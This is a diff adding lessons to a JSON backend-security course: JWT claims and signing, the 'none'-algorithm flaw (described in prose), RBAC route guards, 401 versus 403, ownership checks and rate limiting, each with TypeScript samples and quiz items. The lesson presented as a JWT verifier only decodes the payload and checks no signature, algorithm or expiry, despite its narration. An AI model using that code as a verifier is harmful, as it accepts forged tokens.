+        "tryIt": "Print the signature part (parts[2]) to inspect the third segment.",
+        "check": {
+          "question": "Are standard JSON Web Token (JWT) payloads encrypted by default?",
+          "options": [
+            "No, payloads are only Base64URL-encoded; anyone can decode and read them",
+            "Yes, payloads are encrypted with AES-256",
+            "Yes, only the database server can read them"
+          ],
+          "answer": 0,
+          "why": "JWT payloads are signed for integrity, but encoded in plain text; never store confidential secrets in JWTs."
+        },
+        "output": "Token Section Count: 3\nHeader Part: eyJhbGciOiJIUzI1NiJ9\nPayload Part: eyJ1c2VySWQiOiJ1c3JfMSJ9"
+      },
+      {
+        "title": "Standard Registered Claims: iss, sub, aud, exp, nbf",
+        "say": [
+          "To ensure interoperability across identity providers and services, the JWT specification defines standard Registered Claim names.",
+          "The iss (Issuer) claim identifies the principal that issued the JWT (e.g. \"https://auth.pin.it\").",
+          "The sub (Subject) claim identifies the principal that is the subject of the token (typically the unique User ID).",
+          "The aud (Audience) claim identifies the recipients that the JWT is intended for (e.g. \"https://api.pin.it\"). If a token meant for the billing API is sent to the messaging API, the messaging API rejects it.",
+          "The exp (Expiration Time) claim is a Unix timestamp in seconds after which the token MUST NOT be accepted for processing.",
+          "The nbf (Not Before) claim specifies the time before which the token must not be accepted, preventing premature token usage."
+        ],
+        "example": "Think of a theater ticket. The issuer is the box office, the subject is the seat assignment (Balcony Row 3), the audience is the auditorium staff, and the expiration time is the 10:30 PM show finale. You cannot use the ticket at a different theater or after the show ends.",
+        "code": "interface JwtStandardClaims {\n  iss: string;\n  sub: string;\n  aud: string;\n  exp: number;\n  iat: number;\n}\nconst claims: JwtStandardClaims = {\n  iss: \"https://auth.pin.it\",\n  sub: \"usr_9902\",\n  aud: \"https://api.pin.it\",\n  iat: 1700000000,\n  exp: 1700003600 // Valid for 1 hour (3600 seconds)\n};\nconsole.log(\"Token Subject:\", claims.sub, \"| Validity Duration:\", claims.exp - claims.iat, \"seconds\");",
+        "codeNotes": [
+          {
+            "line": 11,
+            "note": "exp claim defines the exact unix timestamp when token validity terminates."
+          },
+          {
+            "line": 12,
+            "note": "Lifespan is the delta between expiration (exp) and issued-at (iat)."
+          }
+        ],
+        "tryIt": "Add a custom claim role: \"instructor\" alongside the standard claims.",
+        "check": {
+          "question": "What time format is mandated for the JWT exp (expiration) claim?",
+          "options": [
+            "Unix timestamp in seconds (seconds since Jan 1, 1970 UTC)",
+            "ISO 8601 string format",
+            "Milliseconds since boot"
+          ],
+          "answer": 0,
+          "why": "RFC 7519 mandates NumericDate (seconds since Unix epoch) for exp and iat timestamps."
+        },
+        "output": "Token Subject: usr_9902 | Validity Duration: 3600 seconds"
+      },
+      {
+        "title": "Base64URL Encoding vs Standard Base64",
+        "say": [
+          "Standard Base64 encoding uses the 64 characters: A-Z, a-z, 0-9, and the characters plus (+) and slash (/), with equals (=) used for padding.",
+          "However, in web applications, plus and slash have reserved meanings in URLs: plus represents a space, and slash represents path segment delimiters.",
+          "If a standard Base64 string containing slashes or pluses is placed in an HTTP query parameter or URL path, web servers decode or mangle the characters, corrupting the token.",
+          "To solve this, JWT mandates Base64URL encoding (RFC 4648).",
+          "Base64URL modifies standard Base64 by replacing plus (+) with minus (-), replacing slash (/) with underscore (_), and stripping all trailing padding equals signs (=).",
+          "This guarantees that the token string is 100% URL-safe and can be transmitted inside headers, cookies, or query strings without URL-encoding issues."
+        ],
+        "example": "Base64URL is like packaging fragile goods for overseas shipment. Instead of using sharp metal staples that tear through cardboard boxes during transport, the shipper uses smooth reinforced tape that slides cleanly through conveyor rollers.",
+        "code": "function toBase64Url(base64: string): string {\n  return base64\n    .replace(/\\+/g, \"-\")\n    .replace(/\\//g, \"_\")\n    .replace(/=+$/, \"\");\n}\nconst standardB64 = \"a+b/c==\";\nconsole.log(\"Base64URL Converted:\", toBase64Url(standardB64));",
+        "codeNotes": [
+          {
+            "line": 3,
+            "note": "Replaces + with URL-safe hyphen (-)."
+          },
+          {
+            "line": 4,
+            "note": "Replaces / with URL-safe underscore (_)."
+          },
+          {
+            "line": 5,
+            "note": "Strips trailing padding equals signs (=)."
+          }
+        ],
+        "tryIt": "Test converting \"user+name/profile==\" to Base64URL.",
+        "check": {
+          "question": "Why does the JWT specification require Base64URL encoding instead of standard Base64?",
+          "options": [
+            "To replace reserved URL characters (+ and /) with URL-safe characters (- and _) and remove padding",
+            "To encrypt the payload against hackers",
+            "To make tokens 50% smaller"
+          ],
+          "answer": 0,
+          "why": "Base64URL ensures tokens can be placed in URLs and headers without encoding conflicts."
+        },
+        "output": "Base64URL Converted: a-b_c"
+      },
+      {
+        "title": "Cryptographic Signature Verification (HMAC-SHA256 vs RSA)",
+        "say": [
+          "The signature is what makes a JWT trustworthy. There are two primary cryptographic signing schemes used in modern architectures: Symmetric (HMAC) and Asymmetric (RSA/ECDSA).",
+          "In Symmetric Signing (HS256 - HMAC-SHA256), the exact same shared secret key is used to sign the token and verify the token. This is fast and simple, but every service that verifies tokens must possess the secret key.",
+          "If any microservice is compromised, an attacker can use the shared secret to forge tokens for any user.",
+          "In Asymmetric Signing (RS256 - RSA Signature with SHA-256), the authentication service signs tokens using a Private Key. All other services and clients verify tokens using a public Public Key.",
+          "The public key can be distributed freely; services can verify tokens without having the capability to forge tokens.",
+          "Verification recalculates the expected signature from the incoming header and payload and asserts it matches the provided signature byte-for-byte."
+        ],
+        "example": "Symmetric signing is like a padlock where every guard has a copy of the key. Asymmetric signing is like an artist signing an original oil painting: only the artist holds the paintbrush, but anyone in the world can inspect the public signature to verify it is genuine.",
+        "code": "interface SignatureComparison {\n  scheme: string;\n  keys: string;\n  bestFor: string;\n}\nconst schemes: SignatureComparison[] = [\n  { scheme: \"HS256 (Symmetric)\", keys: \"Single Shared Secret\", bestFor: \"Monoliths / Single Service\" },\n  { scheme: \"RS256 (Asymmetric)\", keys: \"Private Key + Public Key\", bestFor: \"Microservices / Distributed Systems\" }\n];\nconsole.log(\"Signing Schemes:\", schemes.map(s => `${s.scheme}: ${s.keys}`));",
+        "codeNotes": [
+          {
+            "line": 7,
+            "note": "HS256 uses a single secret key shared between issuer and verifier."
+          },
+          {
+            "line": 8,
+            "note": "RS256 uses public-key cryptography, allowing zero-trust verification across services."
+          }
+        ],
+        "tryIt": "Log the recommended use case (bestFor) for both signing schemes.",
+        "check": {
+          "question": "What is the primary advantage of RS256 (asymmetric) over HS256 (symmetric) in distributed architectures?",
+          "options": [
+            "Downstream services can verify tokens using a public key without possessing the private signing key",
+            "RS256 runs 100x faster than HS256",
+            "RS256 tokens never expire"
+          ],
+          "answer": 0,
+          "why": "Asymmetric signing allows downstream services to verify tokens without risking private key exposure."
+        },
+        "output": "Signing Schemes: [ 'HS256 (Symmetric): Single Shared Secret', 'RS256 (Asymmetric): Private Key + Public Key' ]"
+      },
+      {
+        "title": "Guarding Against None Algorithm and Expiration Tampering",
+        "say": [
+          "History has recorded notorious vulnerabilities in JWT libraries caused by flawed verification logic.",
+          "The most infamous is the \"None Algorithm\" attack (CVE-2015-9235): the JWT specification originally allowed alg: \"none\" for unsigned debugging tokens.",
+          "Vulnerable libraries inspected the token header: if alg was \"none\", the library bypassed signature verification completely! Attackers changed alg to \"none\", changed the payload to role: \"admin\", stripped the signature, and gained root access.",
+          "A secure JWT verifier must strictly enforce an Algorithm Whitelist: only explicitly allowed algorithms (e.g. [\"HS256\"]) are permitted. Tokens declaring alg: \"none\" must be rejected immediately.",
+          "Furthermore, expiration validation must check that Math.floor(Date.now() / 1000) < payload.exp.",
+          "If the token has expired by even one second, verification must reject the token with an explicit TokenExpiredError."
+        ],
+        "example": "The \"none\" algorithm bug is like an airport boarding gate that allows passengers to hand over a boarding pass with the security stamp erased and a handwritten note saying \"Security check: NONE\". A secure gate turns them away instantly.",
+        "code": "interface TokenHeader { alg: string; typ: string }\nfunction assertValidAlgorithm(header: TokenHeader): void {\n  const ALLOWED_ALGORITHMS = [\"HS256\", \"RS256\"];\n  if (!ALLOWED_ALGORITHMS.includes(header.alg) || header.alg.toLowerCase() === \"none\") {\n    throw new Error(`SECURITY ALERT: Forbidden signing algorithm \"${header.alg}\" rejected!`);\n  }\n}\ntry {\n  assertValidAlgorithm({ alg: \"none\", typ: \"JWT\" });\n} catch (e: any) {\n  console.log(\"Attack Neutralized:\", e.message);\n}",
+        "codeNotes": [
+          {
+            "line": 4,
+            "note": "Strictly rejects alg: \"none\" and algorithms not in the explicit whitelist."
+          },
+          {
+            "line": 10,
+            "note": "Neutralizes the infamous none-algorithm authentication bypass attack."
+          }
+        ],
+        "tryIt": "Test assertValidAlgorithm with alg: \"HS256\" and verify it passes without throwing.",
+        "check": {
+          "question": "What vulnerability occurs if a JWT verification library trusts alg: \"none\" in the token header?",
+          "options": [
+            "Attackers can forge arbitrary administrative tokens without needing any signature or secret key",
+            "The database connection pool drops",
+            "Network cards overheat"
+          ],
+          "answer": 0,
+          "why": "Accepting alg: \"none\" allows attackers to forge tokens by omitting the cryptographic signature."
+        },
+        "output": "Attack Neutralized: SECURITY ALERT: Forbidden signing algorithm \"none\" rejected!"
+      },
+      {
+        "title": "Building a Lightweight Zero-Dependency JWT Verifier",
+        "say": [
+          "Now let us assemble token parsing, Base64URL decoding, registered claim assertions, and expiration validation into a zero-dependency JWT Verifier.",
+          "Our verifier function accepts a raw token string and an expected audience.",
+          "It validates that the token has three dot-separated segments, decodes the header and payload JSON using atob, and parses the fields.",
+          "It asserts that alg is strictly \"HS256\", checks that the current Unix timestamp has not passed exp, and returns a strongly typed TokenPayload object.",
+          "If any check fails (expired, malformed, or untrusted), it throws a descriptive exception.",
+          "This complete verification engine forms the core of authentication guards across modern TypeScript microservices."
+        ],
+        "example": "A lightweight JWT verifier is like an automated passport scanner at an international border. It reads the machine-readable zone, checks security watermarks, verifies expiration dates, and displays the traveler photo on the screen in a quarter of a second.",
+        "code": "function decodeJwtPayload<T>(token: string): T {\n  const parts = token.split(\".\");\n  if (parts.length !== 3) throw new Error(\"Invalid JWT format\");\n  const base64 = parts[1].replace(/-/g, \"+\").replace(/_/g, \"/\");\n  return JSON.parse(atob(base64));\n}\nconst samplePayload = { sub: \"usr_100\", role: \"admin\", exp: 2000000000 };\nconst encodedPayload = btoa(JSON.stringify(samplePayload)).replace(/=/g, \"\");\nconst mockToken = `header.${encodedPayload}.mock_sig`;\nconst decoded = decodeJwtPayload<typeof samplePayload>(mockToken);\nconsole.log(\"Decoded User ID:\", decoded.sub, \"| Role:\", decoded.role);",
+        "codeNotes": [
+          {
+            "line": 4,
+            "note": "Converts Base64URL back to standard Base64 before calling atob."
+          },
+          {
+            "line": 5,
+            "note": "Parses decoded JSON into strongly typed payload object."
+          }
+        ],
+        "tryIt": "Verify that passing a token with 2 segments throws \"Invalid JWT format\".",
+        "check": {
+          "question": "What built-in JavaScript function decodes a base64-encoded string in modern runtimes?",
+          "options": [
+            "atob()",
+            "btoa()",
+            "decodeUri()"
+          ],
+          "answer": 0,
+          "why": "atob() decodes base64-encoded ASCII strings back into their original binary/string data."
+        },
+        "output": "Decoded User ID: usr_100 | Role: admin"
+      }
+    ],
+    "summary": [
+      "A JWT consists of three dot-separated Base64URL segments: Header, Payload, and Signature.",
+      "Payloads are not encrypted; they are public readable claims signed for cryptographic integrity.",
+      "Always enforce an algorithm whitelist and reject alg: \"none\" to prevent authentication bypass attacks.",
+      "Validate registered claims strictly: verify exp (expiration timestamp) on every single request."
+    ],
+    "projectStep": {
+      "title": "Build JWT Parser and Verifier Module",
+      "steps": [
+        "Create src/auth/jwtVerifier.ts with Base64URL decoding and claims validation.",
+        "Implement expiration and algorithm assertion checks with custom JwtVerificationError."
+      ]
+    }
+  },
+  {
+    "day": 19,
+    "title": "Role-Based Access Control (RBAC) & Route Guards",
+    "goal": "Implement authorization layers checking user roles and explicit permission scopes before allowing route access.",
+    "minutes": 30,
+    "parts": [
+      {
+        "title": "Authentication vs Authorization (Who You Are vs What You Can Do)",
+        "say": [
+          "In cybersecurity, Authentication (AuthN) and Authorization (AuthZ) are distinct, complementary concepts that must never be confused.",
+          "Authentication answers the question: \"Who are you?\" When a user provides a valid password or JWT, authentication verifies their identity.",
+          "Authorization answers the question: \"What are you permitted to do?\" Once identity is established, authorization evaluates whether that specific user possesses the permissions required to access a resource or execute an action.",
+          "For example: an intern and a CEO may both successfully authenticate with their corporate credentials. However, the intern is not authorized to approve executive salary payments.",
+          "Authentication happens at the perimeter of the application; authorization happens at the gate of every specific controller and domain service.",
+          "Confusing the two leads to catastrophic privilege escalation vulnerabilities, where any logged-in user can execute administrative commands.",
+          "In high-security banking and enterprise platforms, authorization checks also enforce dual-control (four-eyes principle), requiring two distinct authorized operators to approve high-risk wire transfers.",
+          "Separating authentication token extraction from business permission evaluation ensures your controllers remain completely decoupled from underlying identity providers."
+        ],
+        "example": "Think of checking into a luxury hotel. At the front desk, the clerk checks your passport to verify your identity (Authentication). The keycard they hand you only opens room #402, not the presidential penthouse or the manager office (Authorization).",
+        "code": "interface UserIdentity { id: string; email: string; role: \"student\" | \"admin\" }\nfunction canAccessAdminDashboard(user: UserIdentity | null): boolean {\n  if (!user) return false; // Authentication check fails\n  return user.role === \"admin\"; // Authorization check\n}\nconst studentUser: UserIdentity = { id: \"1\", email: \"stu@pin.it\", role: \"student\" };\nconst adminUser: UserIdentity = { id: \"2\", email: \"adm@pin.it\", role: \"admin\" };\nconsole.log(\"Student Access Allowed:\", canAccessAdminDashboard(studentUser));\nconsole.log(\"Admin Access Allowed:\", canAccessAdminDashboard(adminUser));",
+        "codeNotes": [
+          {
+            "line": 3,
+            "note": "Authentication asserts identity is present and verified."
+          },
+          {
+            "line": 4,
+            "note": "Authorization asserts the verified identity holds the required role."
+          }
+        ],
+        "tryIt": "Pass null to canAccessAdminDashboard to verify unauthenticated rejection.",
+        "check": {
+          "question": "What is the fundamental difference between Authentication and Authorization?",
+          "options": [
+            "Authentication verifies identity (who you are); Authorization verifies permissions (what you can do)",
+            "Authentication is for databases; Authorization is for CSS",
+            "They are identical terms with no difference"
+          ],
+          "answer": 0,
+          "why": "Authentication establishes user identity, whereas Authorization enforces access permissions."
+        },
+        "output": "Student Access Allowed: false\nAdmin Access Allowed: true"
+      },
+      {
+        "title": "The RBAC Data Model: Users, Roles, and Permission Scopes",
+        "say": [
+          "Role-Based Access Control (RBAC) is the gold standard security model for enterprise backend applications.",
+          "In RBAC, permissions are NOT assigned directly to individual users. Assigning permissions directly to users creates an unmaintainable nightmare as teams grow to thousands of employees.",
+          "Instead, permissions are grouped into Roles: e.g. Viewer, Member, Manager, Administrator.",
+          "Permissions are modeled as explicit fine-grained action strings, typically following a resource:action pattern: jobs:read, jobs:create, jobs:delete, users:manage.",
+          "Users are assigned one or more roles. When authorization checks execute, the system checks whether the user roles contain the required permission scope.",
+          "When a new feature is deployed, engineers simply add the new permission scope to the Role definition, and all users holding that role instantly gain access.",
+          "In database modeling, RBAC is typically implemented via three relational tables: users, roles, and user_roles, linked with foreign keys to guarantee referential integrity.",
+          "Caching user permission sets in memory or JWT claims reduces database round-trips from dozens per second to zero during high-traffic API bursts."
+        ],
+        "example": "A hospital staff badge system. Doctors, nurses, and pharmacists each hold a defined role. A doctor role has permissions [prescribe:medicine, perform:surgery]. A nurse role has [administer:medicine, read:records]. Privileges are tied to the medical role, not the individual person.",
+        "code": "type Permission = \"jobs:read\" | \"jobs:create\" | \"jobs:delete\";\nconst ROLE_PERMISSIONS: Record<string, Permission[]> = {\n  viewer: [\"jobs:read\"],\n  editor: [\"jobs:read\", \"jobs:create\"],\n  admin: [\"jobs:read\", \"jobs:create\", \"jobs:delete\"]\n};\nfunction hasPermission(role: string, required: Permission): boolean {\n  const perms = ROLE_PERMISSIONS[role] || [];\n  return perms.includes(required);\n}\nconsole.log(\"Viewer can create jobs:\", hasPermission(\"viewer\", \"jobs:create\"));\nconsole.log(\"Admin can delete jobs:\", hasPermission(\"admin\", \"jobs:delete\"));",
+        "codeNotes": [
+          {
+            "line": 2,
+            "note": "Maps roles to fine-grained permission scopes."
+          },
+          {
+            "line": 7,
+            "note": "Checks if the user role contains the required granular action permission."
+          }
+        ],
+        "tryIt": "Check if an \"editor\" has permission to delete jobs.",
+        "check": {
+          "question": "In RBAC, why are permissions assigned to roles rather than directly to users?",
+          "options": [
+            "To centralize permission management and allow scalable privilege updates across user groups",
+            "To make database tables smaller",
+            "Because SQL cannot query user tables"
+          ],
+          "answer": 0,
+          "why": "Assigning permissions to roles decouples user records from permissions, keeping access control scalable."
+        },
+        "output": "Viewer can create jobs: false\nAdmin can delete jobs: true"
+      },
+      {
+        "title": "Hierarchical Roles and Permission Inheritance",
+        "say": [
+          "In complex organizations, roles naturally form an inheritance hierarchy: an Administrator possesses all the permissions of an Editor, and an Editor possesses all the permissions of a Viewer.",
+          "Manually duplicating common permissions across every single role violates the DRY (Don't Repeat Yourself) principle and leads to configuration drift.",
+          "Hierarchical RBAC models role inheritance: higher-tier roles inherit all permission scopes from lower-tier roles.",
+          "Alternatively, roles can be assigned numerical permission weight tiers: Viewer = 10, Editor = 20, Admin = 30.",
+          "A route guard requiring minimum tier Editor (20) automatically permits both Editors (20) and Admins (30) while rejecting Viewers (10).",
+          "Hierarchical modeling ensures permission rules remain concise, maintainable, and aligned with corporate organizational charts.",
+          "Role hierarchies can be modeled as Directed Acyclic Graphs (DAGs) in software, allowing complex organizational branches like Regional Director inheriting from Area Manager.",
+          "Always write automated unit tests validating role inheritance rules to guarantee that adding new permissions does not inadvertently expose restricted endpoints."
+        ],
+        "example": "Military officer ranks. A Captain outranks a Lieutenant, and a Major outranks a Captain. Any military zone authorized for a Lieutenant is automatically accessible to Captains and Majors without listing every rank explicitly on the door.",
+        "code": "const RoleLevel: Record<string, number> = { VIEWER: 10, MEMBER: 20, ADMIN: 30 };\nfunction isAuthorizedTier(userRole: string, minRequiredRole: string): boolean {\n  const userTier = RoleLevel[userRole] || 0;\n  const requiredTier = RoleLevel[minRequiredRole] || 999;\n  return userTier >= requiredTier;\n}\nconsole.log(\"Member accessing Viewer route:\", isAuthorizedTier(\"MEMBER\", \"VIEWER\"));\nconsole.log(\"Viewer accessing Admin route:\", isAuthorizedTier(\"VIEWER\", \"ADMIN\"));",
+        "codeNotes": [
+          {
+            "line": 1,
+            "note": "Numerical tiers model strict hierarchical authority."
+          },
+          {
+            "line": 5,
+            "note": "userTier >= requiredTier allows higher ranks automatic access."
+          }
+        ],
+        "tryIt": "Test an ADMIN role accessing a MEMBER route to verify inheritance.",
+        "check": {
+          "question": "What is the advantage of hierarchical role inheritance in access control systems?",
+          "options": [
+            "Higher roles automatically inherit lower-tier permissions, eliminating redundant permission declarations",
+            "It forces all users to have the same password",
+            "It bypasses SSL certificates"
+          ],
+          "answer": 0,
+          "why": "Hierarchical roles reduce duplication by allowing higher roles to inherit base capabilities automatically."
+        },
+        "output": "Member accessing Viewer route: true\nViewer accessing Admin route: false"
+      },
+      {
+        "title": "Route Guards: Distinguishing 401 Unauthorized from 403 Forbidden",
+        "say": [
+          "A pervasive mistake in web development is misusing HTTP status codes 401 and 403 interchangeably.",
+          "The HTTP specification (RFC 7235) draws an uncompromising distinction between these two failure codes.",
+          "401 Unauthorized indicates a failure of Authentication. The client has either omitted credentials, supplied an expired token, or provided an invalid signature. The response says: \"I do not know who you are; authenticate first\".",
+          "403 Forbidden indicates a failure of Authorization. The server knows exactly who the client is (authentication succeeded), but that user does NOT possess the required permissions. The response says: \"I know who you are, but you are not allowed in here\".",
+          "Furthermore, sending 401 triggers browser login prompts or prompts frontend routers to redirect to the /login page.",
+          "Sending 403 instructs frontend routers to display an \"Access Denied: Insufficient Permissions\" screen rather than logging the user out.",
+          "In compliance auditing (SOC2, ISO 27001), all 403 Forbidden events must be recorded in security audit logs with the caller user ID, IP address, and attempted endpoint.",
+          "Sudden spikes in 403 status codes from a single user account often indicate automated vulnerability scanning or credential hijacking attempts in progress."
+        ],
+        "example": "Getting stopped by a bouncer at a private club. If you forgot your member ID card at home, that is 401 Unauthorized (prove who you are). If you show your valid General Member ID card but try to enter the VIP cigar lounge, that is 403 Forbidden (we know you, but your tier is not VIP).",
+        "code": "interface RouteEvaluation { status: 200 | 401 | 403; decision: string }\nfunction evaluateRouteAccess(tokenValid: boolean, userRole?: string): RouteEvaluation {\n  if (!tokenValid) {\n    return { status: 401, decision: \"401 Unauthorized: Invalid or missing token\" };\n  }\n  if (userRole !== \"admin\") {\n    return { status: 403, decision: \"403 Forbidden: Admin role required\" };\n  }\n  return { status: 200, decision: \"200 OK: Access granted\" };\n}\nconsole.log(\"No Token:\", evaluateRouteAccess(false).decision);\nconsole.log(\"Student User:\", evaluateRouteAccess(true, \"student\").decision);\nconsole.log(\"Admin User:\", evaluateRouteAccess(true, \"admin\").decision);",
+        "codeNotes": [
+          {
+            "line": 4,
+            "note": "401 is returned when authentication credentials fail."
+          },
+          {
+            "line": 7,
+            "note": "403 is returned when authenticated user lacks required privileges."
+          }
+        ],
+        "tryIt": "Inspect the status code of evaluateRouteAccess(true, \"editor\").",
+        "check": {
+          "question": "When should a backend API return HTTP 403 Forbidden instead of HTTP 401 Unauthorized?",
+          "options": [
+            "When the user is authenticated, but lacks sufficient permissions for the requested resource",
+            "When the user provides an invalid password",
+            "When the database server is offline"
+          ],
+          "answer": 0,
+          "why": "403 Forbidden indicates that the caller is authenticated but lacks required authorization."
+        },
+        "output": "No Token: 401 Unauthorized: Invalid or missing token\nStudent User: 403 Forbidden: Admin role required\nAdmin User: 200 OK: Access granted"
+      },
+      {
+        "title": "Contextual & Attribute-Based Authorization (ABAC Ownership Checks)",
+        "say": [
+          "While RBAC works well for coarse-grained permissions (e.g. \"Can this user edit jobs?\"), it cannot handle fine-grained Resource Ownership checks.",
+          "Consider an endpoint: PUT /jobs/:id. If both Alice and Bob have the role \"recruiter\", should Bob be allowed to edit a job posting that Alice created?",
+          "Under naive RBAC, Bob has the role \"recruiter\", so the check passes! Bob maliciously overwrites Alice's job listing.",
+          "This requires Attribute-Based Access Control (ABAC) or Contextual Ownership Checks.",
+          "In ABAC, the authorization decision evaluates attributes of the subject (user.id), the resource (job.creatorId), and the environment.",
+          "The rule becomes: \"A user may edit a job if they possess the role admin, OR if user.id === job.creatorId\".",
+          "Enforcing ownership guards prevents Insecure Direct Object Reference (IDOR) vulnerabilities, one of the top web API security risks identified by OWASP.",
+          "In collaborative applications (like Google Docs or GitHub), ownership checks expand to Access Control Lists (ACLs) permitting granular shared permissions like read-only, comment, or edit.",
+          "Always execute ownership verification within the same database transaction as the update operation to eliminate Time-of-Check to Time-of-Use (TOCTOU) race conditions."
+        ],
+        "example": "Renting a personal storage locker at a gym. Having a gym membership card (role: member) lets you enter the locker room. But your key only opens locker #42 (your owned resource); it does not open locker #43 owned by another member.",
+        "code": "interface JobResource { id: string; ownerId: string; title: string }\ninterface RequestUser { id: string; role: string }\nfunction canModifyJob(user: RequestUser, job: JobResource): boolean {\n  if (user.role === \"admin\") return true; // Admins override ownership\n  return user.id === job.ownerId; // Resource ownership rule\n}\nconst sampleJob: JobResource = { id: \"jp_1\", ownerId: \"usr_alice\", title: \"Backend Dev\" };\nconsole.log(\"Alice editing own job:\", canModifyJob({ id: \"usr_alice\", role: \"recruiter\" }, sampleJob));\nconsole.log(\"Bob editing Alice job:\", canModifyJob({ id: \"usr_bob\", role: \"recruiter\" }, sampleJob));",
+        "codeNotes": [
+          {
+            "line": 4,
+            "note": "Administrators bypass ownership checks for moderation purposes."
+          },
+          {
+            "line": 5,
+            "note": "Standard users must match the resource ownerId to prevent IDOR attacks."
+          }
+        ],
+        "tryIt": "Test an admin user modifying Alice's job to verify administrative override.",
+        "check": {
+          "question": "What critical security vulnerability is prevented by verifying resource ownership (user.id === resource.ownerId)?",
+          "options": [
+            "Insecure Direct Object Reference (IDOR)",
+            "Cross-Site Scripting (XSS)",
+            "Denial of Service (DoS)"
+          ],
+          "answer": 0,
+          "why": "Resource ownership checks prevent IDOR attacks where users access or modify another user's resources."
+        },
+        "output": "Alice editing own job: true\nBob editing Alice job: false"
+      },
+      {
+        "title": "Building an Extensible Route Authorization Guard Middleware",
+        "say": [
+          "Now let us synthesize role checks, permission scopes, and ownership assertions into a reusable, higher-order Authorization Guard Middleware.",
+          "Our guard factory function requirePermission(permission: string) returns a standard middleware function.",
+          "When invoked, the middleware extracts the authenticated user from the request context.",
+          "If no user exists, it short-circuits with 401 Unauthorized.",
+          "If the user lacks the required permission scope, it short-circuits with 403 Forbidden.",
+          "If the check succeeds, it invokes next() to pass control to the route controller.",
+          "This declarative middleware guard keeps controllers clean, elegant, and secure by design.",
+          "Guard factories can also accept array inputs (e.g. requireAnyRole([\"admin\", \"auditor\"])) to support multi-role endpoint authorization flexibly.",
+          "Building declarative guards establishes a uniform, tamper-evident security baseline across hundreds of microservice endpoints."
+        ],
+        "example": "A security turnstile with interchangeable keycard readers. The facilities team programs the turnstile: \"Require Level 3 Clearance\". When an employee taps their card, the turnstile reads clearance instantly and unlocks the gate only if clearance matches.",
+        "code": "type GuardResult = { status: number; message: string };\nfunction createRoleGuard(requiredRole: string) {\n  return (user?: { role: string }): GuardResult => {\n    if (!user) return { status: 401, message: \"Authentication required\" };\n    if (user.role !== requiredRole && user.role !== \"superadmin\") {\n      return { status: 403, message: \"Forbidden: Insufficient privileges\" };\n    }\n    return { status: 200, message: \"Access granted\" };\n  };\n}\nconst requireAdmin = createRoleGuard(\"admin\");\nconsole.log(\"Guard Without User:\", requireAdmin(undefined));\nconsole.log(\"Guard With Student:\", requireAdmin({ role: \"student\" }));\nconsole.log(\"Guard With Admin:\", requireAdmin({ role: \"admin\" }));",
+        "codeNotes": [
+          {
+            "line": 2,
+            "note": "Higher-order guard factory returns configured authorization middleware."
+          },
+          {
+            "line": 4,
+            "note": "Short-circuits with 401 if unauthenticated, 403 if unauthorized."
+          }
+        ],
+        "tryIt": "Create a requireRecruiter guard and test it with a recruiter user.",
+        "check": {
+          "question": "What is the primary benefit of declarative authorization guard factories in backend routers?",
+          "options": [
+            "They attach security checks to routes declaratively without cluttering business controller functions",
+            "They compress JavaScript files into smaller downloads",
+            "They delete invalid user rows automatically"
+          ],
+          "answer": 0,
+          "why": "Guard factories provide reusable, declarative authorization checks attached directly to routes."
+        },
+        "output": "Guard Without User: { status: 401, message: 'Authentication required' }\nGuard With Student: { status: 403, message: 'Forbidden: Insufficient privileges' }\nGuard With Admin: { status: 200, message: 'Access granted' }"
+      }
+    ],
+    "summary": [
+      "Authentication establishes who a user is; Authorization establishes what they are permitted to do.",
+      "RBAC assigns fine-grained permission scopes to roles rather than directly to individual users.",
+      "Differentiate HTTP 401 (unauthenticated: invalid/missing token) from HTTP 403 (unauthorized: insufficient role).",
+      "Enforce attribute-based ownership checks (user.id === resource.ownerId) to prevent IDOR vulnerabilities."
+    ],
+    "projectStep": {
+      "title": "Implement RBAC and Route Guard Middleware",
+      "steps": [
+        "Create src/auth/rbac.ts defining Roles, Permissions, and role-permission mappings.",
+        "Implement src/middleware/requireRole.ts returning 401 on missing auth and 403 on role mismatch."
+      ]
+    }
+  },
+  {
+    "day": 20,
+    "title": "API Security: Rate Limiting, CORS & Input Sanitization",
+    "goal": "Protect backend endpoints against brute-force attacks, cross-origin request abuse, and injection with rate limiting and CORS headers.",
+    "minutes": 30,
+    "parts": [
+      {
+        "title": "The API Threat Landscape: Brute-Force & Denial of Service",
+        "say": [
+          "Public API endpoints face an unrelenting onslaught of automated bot traffic, credential stuffing attacks, and Denial of Service (DoS) floods.",
+          "Consider an unprotected POST /auth/login endpoint. An attacker with a leaked password database can launch automated scripts submitting 10,000 login attempts per second against your server.",
+          "Without defensive rate limiting, the attacker will crack weak passwords in hours, and your database CPU will spike to 100%, causing a total outage for legitimate users.",
+          "API security is defense-in-depth: no single protection is sufficient on its own. Resilient backends implement layers of rate limiting, cross-origin controls, and input sanitization.",
+          "Every backend engineer must understand how to detect abusive traffic and enforce rate throttling at the perimeter.",
+          "Securing endpoints before launching to production ensures your services stay online and customer data remains secure.",
+          "Web Application Firewalls (WAFs) like Cloudflare and AWS WAF provide initial perimeter filtering, but application-level rate limiting provides vital contextual defense.",
+          "Application-level rate limiters can inspect authenticated user IDs, API tiers, and business limits rather than treating all incoming IP addresses identically."
+        ],
+        "example": "A popular amusement park entrance. If there are no turnstiles, ticket lines, or security guards, thousands of people rush the gates simultaneously, causing a dangerous stampede that halts all rides. Rate limiting turnstiles ensure guests enter in an orderly, safe flow.",
+        "code": "interface ThreatVector {\n  attackType: string;\n  targetEndpoint: string;\n  countermeasure: string;\n}\nconst threats: ThreatVector[] = [\n  { attackType: \"Credential Stuffing\", targetEndpoint: \"POST /auth/login\", countermeasure: \"IP Rate Limiting + Captcha\" },\n  { attackType: \"DoS Flood\", targetEndpoint: \"GET /api/jobs\", countermeasure: \"Sliding Window Throttling\" }\n];\nconsole.log(\"Threats & Countermeasures:\", threats.map(t => `${t.attackType} -> ${t.countermeasure}`));",
+        "codeNotes": [
+          {
+            "line": 7,
+            "note": "Credential stuffing is neutralized by aggressive rate limiting on login routes."
+          },
+          {
+            "line": 8,
+            "note": "DoS query floods are managed by sliding window throttling."
+          }
+        ],
+        "tryIt": "Add a third threat vector for \"XSS Injection\" on POST /comments countered by Input Sanitization.",
+        "check": {
+          "question": "What is the primary objective of rate limiting on sensitive API endpoints like /auth/login?",
+          "options": [
+            "To prevent automated brute-force password guessing and resource exhaustion attacks",
+            "To speed up database indexing",
+            "To make HTTP requests completely anonymous"
+          ],
+          "answer": 0,
+          "why": "Rate limiting caps request volume, neutralizing brute-force and credential stuffing attacks."
+        },
+        "output": "Threats & Countermeasures: [ 'Credential Stuffing -> IP Rate Limiting + Captcha', 'DoS Flood -> Sliding Window Throttling' ]"
+      },
+      {
